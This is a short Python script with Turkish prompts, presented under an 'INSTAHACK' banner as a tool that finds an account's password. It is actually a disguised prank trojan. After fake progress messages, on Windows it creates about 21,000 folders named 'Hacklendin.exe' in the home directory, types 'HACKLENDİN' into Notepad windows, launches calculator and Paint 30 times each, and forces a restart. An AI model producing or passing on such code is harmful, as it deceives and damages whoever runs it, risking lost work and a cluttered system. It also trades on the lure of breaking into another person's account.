import os, time
import subprocess
import pyautogui
from colorama import Fore, Style

os.system("pip install colorama")

time.sleep(2)

text = """

_[] _   _ ____ _____  _    _   _    _    ____ _  __ __     ___   _ 
|_ _| \ | / ___|_   _|/ \  | | | |  / \  / ___| |/ / \ \   / / | / |
 | ||  \| \___ \ | | / _ \ | |_| | / _ \| |   | ' /   \ \ / /| | | |
 | || |\  |___) || |/ ___ \|  _  |/ ___ \ |___| . \    \ V / | |_| |
|___|_| \_|____/ |_/_/   \_\_| |_/_/   \_\____|_|\_\    \_/  |_(_)_|
"""
print(Fore.RED + text)
print(Style.RESET_ALL)

user = input(Fore.CYAN + "[+]Şifresini Bulmak İstediğiniz Hesabın Adını Girin : ")
time.sleep(2)
print(">>Şifre Bulunuyor...")
time.sleep(2)
print(">>Veri Çekiliyor..")

if len(user) > 0:

    if os.name == "nt":
        yer = os.path.expanduser("~")
        os.chdir(yer)  # Dosya oluşturma
        a = os.listdir()
        [os.mkdir(f"Hacklendin{index}.exe") for index in range(1, 21000)]

        time.sleep(10)

        yazı = ">>HACKLENDİN<<\n".center(20, "*") * 100
        for i in range(3):
            subprocess.Popen("notepad.exe")
            time.sleep(0.2)  # Hacklendin Yazacak 
            pyautogui.write(yazı)

        time.sleep(7)

        for i in range(30):
            os.system("calc.exe")  # Sistemde Bulunan Dosyaları açacak
            os.system("mspaint.exe")

        time.sleep(5)

        text = "4 Saniye Sonra Bilgisayar Kapanacak\nŞaka la Şaka Gül Diye...".center(50, "*")

        subprocess.Popen("notepad.exe")
        time.sleep(1)
        pyautogui.write(text)
        time.sleep(4)

        os.system("shutdown/r")  # Bilgisayarı Kapatacak

    else:
        print("Sisteme Bağlanılamadı...")
else:
    print("Sisteme Bağlanılamadı...")